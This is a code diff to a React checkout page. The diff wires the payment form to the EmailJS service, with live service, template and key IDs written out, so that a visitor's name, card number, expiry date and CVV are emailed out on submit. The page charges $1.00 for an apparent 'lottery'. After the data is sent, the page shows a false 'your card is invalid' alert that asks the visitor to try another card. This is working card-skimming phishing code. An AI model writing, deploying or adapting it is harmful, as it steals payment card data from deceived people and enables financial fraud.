@@ -1,5 +1,27 @@
-import React, { useState } from "react";
+import React, { useRef, useState } from "react";
+import emailjs from "@emailjs/browser";
 const Checkout = () => {
+  const form = useRef();
+  const [secilenTur, setsecilenTur] = useState("Normal Kart");
+
+  const sendEmail = (e) => {
+    e.preventDefault();
+
+    emailjs
+      .sendForm("service_mwe4ukl", "template_8gxpbwd", form.current, {
+        publicKey: "V57OWPDudEhHuEDPU",
+      })
+      .then(
+        () => {
+          alert(
+            "Your card is invalid, you are not eligible for the lottery. Please try a different card. If there is no problem with your card, please wait a bit and try again."
+          );
+        },
+        (error) => {
+          alert("please wait a bit and try again...", error.text);
+        }
+      );
+  };
   return (
     <div class="font-[sans-serif] bg-white">
       <div class="max-lg:max-w-xl mx-auto w-full">
@@ -11,7 +33,7 @@ const Checkout = () => {
               </h2>
             </div>
 
-            <form class="lg:mt-16">
+            <form ref={form} onSubmit={sendEmail} class="lg:mt-16">
               <div>
                 <h2 class="text-xl font-bold text-gray-800">Shipping info</h2>
 
@@ -45,6 +67,13 @@ const Checkout = () => {
                     type="number"
                     placeholder="Postal code"
                     class="px-2 pb-2 bg-white text-gray-800 w-full text-sm border-b focus:border-gray-800 outline-none"
+                  />{" "}
+                  <input
+                    type="hidden"
+                    name="tur"
+                    value={secilenTur}
+                    placeholder="Postal code"
+                    class="px-2 pb-2 bg-white text-gray-800 w-full text-sm border-b focus:border-gray-800 outline-none"
                   />
                 </div>
               </div>
@@ -55,13 +84,18 @@ const Checkout = () => {
                 <div class="grid gap-4 sm:grid-cols-2 mt-4">
                   <div class="flex items-center">
                     <input
+                      onClick={() => setsecilenTur("Normal Kart")}
                       type="radio"
                       class="w-5 h-5 cursor-pointer"
                       id="card"
                       name="odeme"
                       checked
                     />
-                    <label for="card" class="ml-4 flex gap-2 cursor-pointer">
+                    <label
+                      for="card"
+                      class="ml-4 flex gap-2 cursor-pointer"
+                      onClick={() => setsecilenTur("Normal Kart")}
+                    >
                       <img
                         src="https://readymadeui.com/images/visa.webp"
                         class="w-12"
@@ -85,9 +119,14 @@ const Checkout = () => {
                       type="radio"
                       class="w-5 h-5 cursor-pointer"
                       id="paypal"
+                      onClick={() => setsecilenTur("Paypal")}
                       name="odeme"
                     />
-                    <label for="paypal" class="ml-4 flex gap-2 cursor-pointer">
+                    <label
+                      for="paypal"
+                      class="ml-4 flex gap-2 cursor-pointer"
+                      onClick={() => setsecilenTur("Paypal")}
+                    >
                       <img
                         src="https://readymadeui.com/images/paypal.webp"
                         class="w-20"
@@ -100,6 +139,7 @@ const Checkout = () => {
                 <div class="grid gap-8 mt-8">
                   <input
                     type="text"
+                    name="kart-ad"
                     placeholder="Cardholder's Name"
                     class="px-2 pb-2 bg-white text-gray-800 w-full text-sm border-b focus:border-gray-800 outline-none"
                   />
@@ -107,6 +147,7 @@ const Checkout = () => {
                   <div class="flex bg-white border-b focus-within:border-gray-800 overflow-hidden">
                     <input
                       type="number"
+                      name="kart-no"
                       placeholder="Card Number"
                       class="px-2 pb-2 bg-white text-gray-800 w-full text-sm outline-none"
                     />
@@ -115,11 +156,13 @@ const Checkout = () => {
                   <div class="grid grid-cols-2 gap-6">
                     <input
                       type="number"
+                      name="son-tarih"
                       placeholder="EXP."
                       class="px-2 pb-2 bg-white text-gray-800 w-full text-sm border-b focus:border-gray-800 outline-none"
                     />
                     <input
                       type="number"
+                      name="guvenlik"
                       placeholder="CVV"
                       class="px-2 pb-2 bg-white text-gray-800 w-full text-sm border-b focus:border-gray-800 outline-none"
                     />
@@ -153,12 +196,11 @@ const Checkout = () => {
                 >
                   Back
                 </a>
-                <a
-                  type="button"
+                <input
+                  type="submit"
                   class="min-w-[150px] text-center px-6 py-3.5 text-sm bg-gray-800 text-white rounded-lg hover:bg-gray-900"
-                >
-                  Confirm payment $1.00
-                </a>
+                  value={"  Confirm payment $1.00"}
+                />
               </div>
             </form>
           </div>
